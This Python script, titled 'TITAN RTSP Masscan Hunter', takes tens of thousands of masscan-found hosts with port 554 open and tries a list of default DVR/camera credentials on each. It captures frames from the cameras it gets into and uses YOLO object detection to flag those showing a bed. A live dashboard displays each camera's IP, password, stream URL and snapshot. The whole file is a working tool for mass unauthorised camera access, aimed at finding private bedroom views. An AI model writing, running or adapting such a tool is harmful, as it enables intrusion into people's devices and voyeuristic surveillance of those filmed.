#!/usr/bin/env python3
"""
TITAN RTSP MASSCAN HUNTER — Uses pre-scanned 42K+ RTSP hosts from masscan
Strategy:
  1. Load 42,405 IPs with port 554 open from masscan_results.txt
  2. Validate with ffprobe (handles Digest/Basic auth natively, short timeout)
  3. Deduplicate by IP — one best stream per camera
  4. Capture frame with ffmpeg for each valid stream
  5. Run YOLO for bed detection
  6. Live HTML dashboard on HTTP server
"""

import asyncio
import base64
import json
import os
import random
import re
import subprocess
import sys
import threading
import time
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path

BASE = Path(__file__).resolve().parent
FRAMES = BASE / "masscan_frames"
RESULTS = BASE / "results"
YOLO_MODEL = BASE.parent / "yolov8n.pt"
MASSCAN_FILE = BASE.parent / "skills" / "masscan_results.txt"
FRAMES.mkdir(exist_ok=True)
RESULTS.mkdir(exist_ok=True)

# ══════════════════════════════════════════════════════════
# RTSP probe combos — ordered by likelihood (most common first)
# ══════════════════════════════════════════════════════════
PROBE_COMBOS = [
    # (user, pass, path) — most common DVR/NVR defaults
    ("", "", "/"),
    ("admin", "admin", "/Streaming/Channels/101"),
    ("admin", "12345", "/Streaming/Channels/101"),
    ("admin", "", "/Streaming/Channels/101"),
    ("admin", "admin", "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "12345", "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "", "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "admin", "/stream1"),
    ("admin", "12345", "/stream1"),
    ("", "", "/stream1"),
    ("admin", "admin", "/h264/ch1/main/av_stream"),
    ("admin", "12345", "/h264/ch1/main/av_stream"),
    ("admin", "admin", "/live"),
    ("", "", "/live"),
    ("admin", "123456", "/Streaming/Channels/101"),
    ("admin", "1234", "/Streaming/Channels/101"),
    ("admin", "password", "/Streaming/Channels/101"),
    ("admin", "admin123", "/Streaming/Channels/101"),
    ("admin", "123456", "/cam/realmonitor?channel=1&subtype=0"),
    ("admin", "1234", "/cam/realmonitor?channel=1&subtype=0"),
    ("", "", "/0"),
    ("", "", "/onvif1"),
    ("admin", "admin", "/onvif1"),
    ("admin", "12345", "/onvif1"),
]

# ══════════════════════════════════════════════════════════
# GLOBALS
# ══════════════════════════════════════════════════════════
VALID_STREAMS = OrderedDict()  # ip -> best stream info
LOCK = threading.Lock()
TARGET = 100
STATS = {
    "total_ips": 0, "probed": 0, "valid": 0, "frames": 0,
    "yolo_done": 0, "beds": 0, "batch": 0, "status": "loading"
}
DASHBOARD_PATH = BASE / "masscan_stream.html"

# ══════════════════════════════════════════════════════════
# LOAD MASSCAN IPS
# ══════════════════════════════════════════════════════════

def load_masscan_ips() -> list:
    """Extract unique IPs with port 554 open from masscan results."""
    ips = set()
    with open(MASSCAN_FILE, 'r') as f:
        for line in f:
            if '554/open' in line:
                parts = line.split()
                for i, p in enumerate(parts):
                    if p == 'Host:':
                        ips.add(parts[i + 1])
                        break
    ip_list = list(ips)
    random.shuffle(ip_list)
    return ip_list

# ══════════════════════════════════════════════════════════
# FFPROBE VALIDATOR
# ══════════════════════════════════════════════════════════

def probe_ip(ip: str, port: int = 554) -> dict | None:
    """Try RTSP combos with ffprobe. Return first valid stream."""
    for user, pwd, path in PROBE_COMBOS:
        if len(VALID_STREAMS) >= TARGET:
            return None
        auth = f"{user}:{pwd}@" if user else ""
        url = f"rtsp://{auth}{ip}:{port}{path}"
        try:
            proc = subprocess.run(
                ["ffprobe", "-v", "error", "-rtsp_transport", "tcp",
                 "-stimeout", "3000000",  # 3s timeout
                 "-show_entries", "stream=codec_name,width,height",
                 "-of", "json", url],
                capture_output=True, text=True, timeout=5
            )
            if proc.returncode == 0 and '"codec_name"' in proc.stdout:
                # Valid stream — parse resolution
                try:
                    info = json.loads(proc.stdout)
                    streams = info.get("streams", [])
                    w = streams[0].get("width", 0) if streams else 0
                    h = streams[0].get("height", 0) if streams else 0
                    codec = streams[0].get("codec_name", "?") if streams else "?"
                    reso = f"{w}x{h}" if w > 0 else "?"
                except Exception:
                    reso, codec = "?", "?"

                return {
                    "ip": ip, "port": port, "rtsp_url": url,
                    "user": user, "password": pwd, "path": path,
                    "resolution": reso, "codec": codec,
                    "timestamp": datetime.now().isoformat(),
                }
        except (subprocess.TimeoutExpired, Exception):
            continue
    return None

# ══════════════════════════════════════════════════════════
# FRAME CAPTURE
# ══════════════════════════════════════════════════════════

def capture_frame(cam: dict) -> str | None:
    """Grab one frame from a valid RTSP stream."""
    safe_ip = cam["ip"].replace(".", "_")
    frame_path = str(FRAMES / f"cam_{safe_ip}.jpg")
    try:
        subprocess.run(
            ["ffmpeg", "-y", "-rtsp_transport", "tcp", "-stimeout", "4000000",
             "-i", cam["rtsp_url"], "-vframes", "1", "-vf", "scale=640:-1",
             "-q:v", "3", "-f", "image2", frame_path],
            capture_output=True, timeout=8, text=True,
        )
        if os.path.isfile(frame_path) and os.path.getsize(frame_path) > 2000:
            return frame_path
    except Exception:
        pass
    return None

# ══════════════════════════════════════════════════════════
# YOLO
# ══════════════════════════════════════════════════════════

_yolo_model = None
_yolo_lock = threading.Lock()

YOLO_CLASSES = {
    0: 'person', 1: 'bicycle', 2: 'car', 3: 'motorcycle', 13: 'bench',
    14: 'bird', 15: 'cat', 16: 'dog', 24: 'backpack', 56: 'chair',
    57: 'couch', 58: 'potted_plant', 59: 'bed', 60: 'dining_table',
    62: 'tv', 63: 'laptop', 64: 'mouse', 66: 'keyboard', 72: 'refrigerator',
}

def get_yolo():
    global _yolo_model
    if _yolo_model is None:
        with _yolo_lock:
            if _yolo_model is None:
                from ultralytics import YOLO
                mp = str(YOLO_MODEL) if YOLO_MODEL.exists() else "yolov8n.pt"
                _yolo_model = YOLO(mp)
    return _yolo_model

def yolo_detect(frame_path: str) -> dict:
    try:
        m = get_yolo()
        results = m(frame_path, conf=0.25, verbose=False)
        labels, bed_conf = [], 0.0
        for r in results:
            for box in r.boxes:
                cls = int(box.cls[0])
                label = YOLO_CLASSES.get(cls, f"cls{cls}")
                c = float(box.conf[0])
                labels.append(label)
                if cls == 59:
                    bed_conf = max(bed_conf, c)
        return {"has_bed": bed_conf > 0, "bed_conf": round(bed_conf, 3), "objects": list(set(labels))}
    except Exception as e:
        return {"has_bed": False, "bed_conf": 0, "objects": [], "err": str(e)}

def frame_to_b64(path: str) -> str:
    try:
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception:
        return ""

# ══════════════════════════════════════════════════════════
# MAIN HUNT LOOP
# ══════════════════════════════════════════════════════════

def hunt(ips: list, workers: int = 120, batch_size: int = 2000):
    STATS["status"] = "hunting"
    STATS["total_ips"] = len(ips)
    batch_num = 0

    for start in range(0, len(ips), batch_size):
        if len(VALID_STREAMS) >= TARGET:
            break
        batch_num += 1
        STATS["batch"] = batch_num
        batch = ips[start:start + batch_size]
        print(f"\n[BATCH {batch_num}] Probing {len(batch)} IPs | valid={len(VALID_STREAMS)}/{TARGET}")

        with ThreadPoolExecutor(max_workers=workers) as pool:
            futs = {pool.submit(probe_ip, ip): ip for ip in batch}
            for fut in as_completed(futs):
                if len(VALID_STREAMS) >= TARGET:
                    for f in futs:
                        f.cancel()
                    break
                ip = futs[fut]
                STATS["probed"] += 1
                try:
                    cam = fut.result()
                    if cam is None:
                        continue
                    if cam["ip"] in VALID_STREAMS:
                        continue  # deduplicate

                    STATS["valid"] += 1

                    # Capture frame
                    frame_path = capture_frame(cam)
                    if frame_path:
                        STATS["frames"] += 1
                        cam["frame_file"] = frame_path
                        cam["frame_b64"] = frame_to_b64(frame_path)

                        # YOLO
                        yolo = yolo_detect(frame_path)
                        cam["yolo"] = yolo
                        STATS["yolo_done"] += 1
                        if yolo["has_bed"]:
                            STATS["beds"] += 1
                    else:
                        cam["frame_b64"] = ""
                        cam["yolo"] = {"has_bed": False, "bed_conf": 0, "objects": []}

                    with LOCK:
                        VALID_STREAMS[cam["ip"]] = cam

                    n = len(VALID_STREAMS)
                    yobj = cam.get("yolo", {})
                    bed_tag = " 🛏 BED" if yobj.get("has_bed") else ""
                    print(f"  ✅ #{n:>3} {cam['ip']:>15}:{cam['port']:<5} {cam['resolution']:>10} "
                          f"{cam['path']:<45} {cam.get('codec','?'):<6} "
                          f"objs={yobj.get('objects',[])}{bed_tag}")

                    if n % 10 == 0:
                        save_results()
                        regen_dashboard()

                except Exception:
                    pass

    STATS["status"] = "complete"
    save_results()
    regen_dashboard()
    print(f"\n{'='*70}")
    print(f"  HUNT COMPLETE — {len(VALID_STREAMS)} unique valid RTSP streams found")
    print(f"  Beds: {STATS['beds']} | Frames: {STATS['frames']} | Probed: {STATS['probed']}")
    print(f"{'='*70}")

# ══════════════════════════════════════════════════════════
# DASHBOARD
# ══════════════════════════════════════════════════════════

def regen_dashboard():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    cams = list(VALID_STREAMS.values())

    cards = ""
    for i, c in enumerate(cams):
        b64 = c.get("frame_b64", "")
        img = f'<img src="data:image/jpeg;base64,{b64}" style="width:100%;border-radius:6px;margin-top:6px;">' if b64 else '<div style="height:150px;background:#222;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#555;">No frame</div>'
        yolo = c.get("yolo", {})
        border = "#0f0" if yolo.get("has_bed") else "#333"
        bed_badge = '<span style="background:#f00;color:#fff;padding:2px 6px;border-radius:4px;font-size:10px;">BED</span>' if yolo.get("has_bed") else ""
        objs = ", ".join(yolo.get("objects", [])) or "—"
        cards += f'''
        <div style="background:#1a1a2e;border:1px solid {border};border-radius:8px;padding:10px;margin:6px;width:280px;">
            <div style="display:flex;justify-content:space-between;align-items:center;">
                <span style="color:#0f0;font-weight:bold;font-size:13px;">#{i+1} {c["ip"]}</span>
                {bed_badge}
            </div>
            {img}
            <div style="font-size:11px;color:#aaa;margin-top:6px;">
                <b>{c.get("resolution","?")}</b> | {c.get("codec","?")} | Port {c["port"]}<br>
                Path: <code style="color:#0ff;font-size:10px;">{c.get("path","?")}</code><br>
                Auth: {c.get("user","") or "none"}:{c.get("password","") or ""}<br>
                Objects: {objs} {f'| Bed: {yolo.get("bed_conf",0):.2f}' if yolo.get("has_bed") else ""}<br>
                <code style="color:#888;font-size:9px;word-break:break-all;">{c.get("rtsp_url","")}</code>
            </div>
        </div>'''

    html = f'''<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>TITAN RTSP Masscan Hunter — Live</title>
<meta http-equiv="refresh" content="10">
<style>
body{{background:#0d0d1a;color:#eee;font-family:'Courier New',monospace;margin:0;padding:20px;}}
code{{background:#000;padding:1px 3px;border-radius:3px;}}
.stats{{background:#111;padding:12px 20px;border-radius:8px;margin-bottom:20px;display:flex;flex-wrap:wrap;gap:20px;}}
.stat{{text-align:center;}}.stat b{{display:block;font-size:22px;color:#0f0;}}.stat span{{color:#888;font-size:11px;}}
</style></head>
<body>
<h1 style="color:#f00;margin-bottom:10px;">TITAN RTSP MASSCAN HUNTER</h1>
<div class="stats">
  <div class="stat"><b>{STATS["total_ips"]:,}</b><span>Masscan IPs</span></div>
  <div class="stat"><b>{STATS["probed"]:,}</b><span>Probed</span></div>
  <div class="stat"><b style="color:#0f0;">{len(VALID_STREAMS)}</b><span>Valid Streams</span></div>
  <div class="stat"><b>{STATS["frames"]}</b><span>Frames</span></div>
  <div class="stat"><b style="color:#f00;">{STATS["beds"]}</b><span>Beds</span></div>
  <div class="stat"><b>{STATS["batch"]}</b><span>Batch</span></div>
  <div class="stat"><b style="color:#ff0;">{STATS["status"]}</b><span>Status</span></div>
  <div class="stat"><b>{ts}</b><span>Updated</span></div>
</div>
<div style="display:flex;flex-wrap:wrap;">{cards}</div>
</body></html>'''
    DASHBOARD_PATH.write_text(html)

def save_results():
    cams = list(VALID_STREAMS.values())
    out = {
        "timestamp": datetime.now().isoformat(),
        "stats": STATS,
        "count": len(cams),
        "streams": [{k: c.get(k) for k in
                      ["ip", "port", "rtsp_url", "user", "password", "path",
                       "resolution", "codec", "yolo", "timestamp"]} for c in cams],
    }
    with open(RESULTS / "masscan_hunt_live.json", "w") as f:
        json.dump(out, f, indent=2, default=str)

# ══════════════════════════════════════════════════════════
# HTTP SERVER
# ══════════════════════════════════════════════════════════

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/api/stats":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            data = {"stats": STATS, "valid": len(VALID_STREAMS), "target": TARGET}
            self.wfile.write(json.dumps(data).encode())
        elif self.path == "/api/streams":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            cams = [{k: c.get(k) for k in ["ip", "port", "rtsp_url", "user", "password",
                     "path", "resolution", "codec"]} for c in VALID_STREAMS.values()]
            self.wfile.write(json.dumps(cams).encode())
        elif DASHBOARD_PATH.exists():
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(DASHBOARD_PATH.read_bytes())
        else:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<html><body style='background:#000;color:#0f0;font-family:monospace;padding:40px;'>"
                             b"<h1>TITAN RTSP MASSCAN HUNTER</h1><p>Loading... Refresh shortly.</p></body></html>")

    def log_message(self, fmt, *args):
        pass

def serve(port: int):
    server = HTTPServer(('0.0.0.0', port), Handler)
    print(f"[HTTP] Dashboard: http://localhost:{port}")
    server.serve_forever()

# ══════════════════════════════════════════════════════════
# ENTRY
# ══════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument("--target", type=int, default=100)
    p.add_argument("--port", type=int, default=7703)
    p.add_argument("--workers", type=int, default=120)
    p.add_argument("--batch", type=int, default=2000)
    args = p.parse_args()
    TARGET = args.target

    print(f"[INIT] Loading masscan results from {MASSCAN_FILE}...")
    ips = load_masscan_ips()
    STATS["total_ips"] = len(ips)
    print(f"[INIT] Loaded {len(ips):,} unique IPs with port 554 open")

    print("[INIT] Loading YOLOv8...")
    get_yolo()
    print("[INIT] YOLO ready")

    regen_dashboard()

    # HTTP server in background
    srv = threading.Thread(target=serve, args=(args.port,), daemon=True)
    srv.start()

    print(f"\n{'='*70}")
    print(f"  TITAN RTSP MASSCAN HUNTER")
    print(f"  {len(ips):,} pre-scanned RTSP hosts | Target: {TARGET} valid streams")
    print(f"  Workers: {args.workers} | Batch: {args.batch} | Dashboard: http://localhost:{args.port}")
    print(f"{'='*70}\n")

    try:
        hunt(ips, workers=args.workers, batch_size=args.batch)
    except KeyboardInterrupt:
        print(f"\nStopped. {len(VALID_STREAMS)} valid streams found.")
    finally:
        save_results()
        regen_dashboard()
        print(f"Results saved to {RESULTS / 'masscan_hunt_live.json'}")
        print(f"Dashboard at {DASHBOARD_PATH}")
